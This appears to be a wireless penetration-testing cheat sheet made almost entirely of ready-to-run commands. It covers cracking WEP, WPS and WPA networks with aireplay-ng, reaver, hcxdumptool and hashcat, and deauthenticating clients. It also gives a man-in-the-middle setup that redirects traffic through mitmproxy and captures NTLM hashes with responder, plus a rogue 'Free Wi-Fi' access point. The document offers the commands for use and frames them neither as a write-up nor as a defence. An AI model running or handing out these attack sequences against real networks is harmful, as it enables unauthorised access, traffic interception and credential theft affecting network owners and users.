`` Network discovery

    ~$ iwlist wlan0 scan | grep -Ei "address|essid|frequency|cipher|authentication|ieee" 

`` Setting up

    ~$ airmon-ng check kill
    ~$ ip link set wlan0 down
    
    -- Random but matching device type
    ~$ macchanger -a wlan0

    -- Set to desired MAC address
    ~$ macchanger -m 00:00:00:00:00:00 wlan0

    -- Setting monitor mode with airmon-ng should work in most cases
    ~$ airmon-ng start wlan0

    -- With current rtl8812au driver airmon-ng fails to set monitor mode for Alfa AWUS1900, use
    ~$ iw dev wlan0 set type monitor
    ~$ iwconfig wlan0 mode monitor

    ~$ ip link set wlan0 up

    -- Test injection
    ~$ aireplay-ng wlan0 -9

    -- Select channel of the target network
    ~$ iwconfig wlan0 channel 11

`` Client discovery

    -- 2.4Ghz
    ~$ airodump-ng wlan0

    -- 5Ghz
    ~$ airodump-ng wlan0 --band a

`` Helpers

    `` Check current MAC address

        ~$ iw wlan0 info | grep addr

    `` Check current channel

        ~$ iwlist wlan0 channel | grep -i current

    `` Back to managed mode

        ~$ iwconfig wlan0 mode managed

    `` Boosting tx power

        ~$ iw wlan0 set txpower fixed 3000

    `` Check manufacturer based on MAC

        ~$ ~/pentesting-cookbook/bin/mac_oui.sh 00:00:00:00:00:00

`` Attacks

    `` WEP

        `` wifite2 powered by deauth/replay (works better than with internal deauth)

            -- [1] Start attack on WEP network
            ~$ wifite -i wlan0 --keep-ivs

            -- (?) Try fake authentication if not started by wifite
            ~$ aireplay-ng -1 6000 -o 1 -q 10 -a 00:00:00:00:00:00 -h 01:02:03:04:05:06 wlan0

            -- [2] Start ARP-request replay
            ~$ aireplay-ng -3 -b 00:00:00:00:00:00 wlan0

            -- [3] Deauth specific client on the target network until ARP requests captured
            ~$ aireplay-ng -0 1 -a 00:00:00:00:00:00 -c 00:24:D6:56:45:24 wlan0

            -- (?) Improve results with packet broadcasting
            ~$ aireplay-ng -2 -p 0841 -c ff:ff:ff:ff:ff:ff -b 00:00:00:00:00:00 -h 01:02:03:04:05:06 wlan0

            -- (?) Improve results with caffe-latte attack
            ~$ aireplay-ng -6 -b 00:00:00:00:00:00 wlan0

        `` besside-ng

            -- Works but slow compared to the wifite approach
            ~$ besside-ng -b 00:00:00:00:00:00 wlan0

        `` wesside-ng

            -- Unreliable

    `` WPS

        `` wash / reaver

            -- [1] Find the target
            ~$ wash -i wlan0

            -- [2] Crack
            ~$ reaver -i wlan0 -b 00:00:00:00:00:00 -c 11 -vv -K
            
            -- Retrieve passphrase using PIN
            ~$ reaver -i wlan0 -b 00:00:00:00:00:00 -s y -vv -p 00000000

        `` Device model using Wireshark
        
            - Filter: (wps.device_name != "" || wps.model_name != "" || wps.model_number != "")
            - In Tag: Vendor [...] WPS
                - Manufacturer: TP-Link
                - Model Name: TL-WR841N
                - Device Name: Wireless N Router TL-WR841N

    `` WPA

        `` PMKID capture (the "new" way aka "client-less attack")

            ~$ echo '00:00:00:00:00:00' | tr -d ':' > filter
            ~$ hcxdumptool -i wlan0 -c 11 --enable_status=1 --filterlist=filter --filtermode=3 -o wpa.pcap
            ~$ hcxpcaptool -z wpa.pmkid wpa.pcap

            -- Dictionary attack
            ~$ hashcat -m 16800 wpa.pmkid VAR_WORDLIST

            -- Dictionary attack with combinations (hashcat rules)
            ~$ hashcat -m 16800 -r /usr/share/hashcat/rules/best64.rule wpa.pmkid VAR_WORDLIST

        `` wifite (the "new" way with PMKID capture by default)

            ~$ wifite -i wlan0 -b 00:00:00:00:00:00

        `` besside-ng (the "old" way)

            -- Capture WPA handshake and deauth
            ~$ besside-ng -b 00:00:00:00:00:00 wlan0

            -- Convert to a hashcat capture file
            ~$ /usr/lib/hashcat-utils/cap2hccapx.bin wpa.cap wpa.hccapx

            -- Dictionary attack
            ~$ hashcat -m 2500 wpa.hccapx VAR_WORDLIST

            -- Dictionary attack with combinations (hashcat rules)
            ~$ hashcat -m 2500 -r /usr/share/hashcat/rules/best64.rule wpa.hccapx VAR_WORDLIST

        `` Lucky approach

            -- Hop between channels, stay 5 seconds on each
            ~$ hcxdumptool -i wlan0 -o wpa.pcap -t 5 --enable_status=1

`` Routing, injection and NTLM

    ~$ route del default
    ~$ route add default gw $_IP wlan0
    ~$ iptables -A INPUT -j LOG
    ~$ echo 1 > /proc/sys/net/ipv4/ip_forward
    ~$ iptables -F
    ~$ iptables -t nat -F
    ~$ iptables -t nat -A PREROUTING -i wlan0 -p tcp -m tcp --dport 80 -j REDIRECT --to-ports 8080
    ~$ iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE
    ~$ mitmproxy --mode transparent -s $_FILE.py --listen-host $_IP
    ~$ responder -I wlan0 -wF

`` CLI configuration

    ~$ vim wireless.config
        ctrl_interface=/var/run/wpa_supplicant
        ctrl_interface_group=0
        update_config=1
        network={
            ssid="VAR_STRING"
            psk="VAR_STRING"
        }
    ~$ wpa_supplicant -D wext -i wlan0 -c wireless.config
    ~$ dhclient wlan0

`` IPv6 AP

    ~$ cat > /etc/radvd.conf << EOF
    interface br-wlan-ipv6 {
        AdvSendAdvert on;
        MinRtrAdvInterval 3;
        MaxRtrAdvInterval 10;
        prefix fd13:37::/32 {
            AdvOnLink on;
            AdvAutonomous on;
            AdvRouterAddr on;
        };
    };
    EOF
    ~$ cat > hostapd.conf << EOF
    interface=wlan0
    bridge=br-wlan-ipv6
    hw_mode=g
    channel=10
    wmm_enabled=1
    ssid=Free Wi-Fi
    auth_algs=1
    wpa=2
    wpa_key_mgmt=WPA-PSK
    rsn_pairwise=CCMP
    wpa_passphrase=somepassword
    EOF
    ~$ ip link set wlan0 down
    ~$ macchanger -A wlan0
    ~$ ip link set wlan0 up
    ~$ ip link add name br-wlan-ipv6 type bridge
    ~$ ip address add fd13:37::1 dev br-wlan-ipv6
    ~$ ip link set br-wlan-ipv6 up
    ~$ hostapd ./hostapd.conf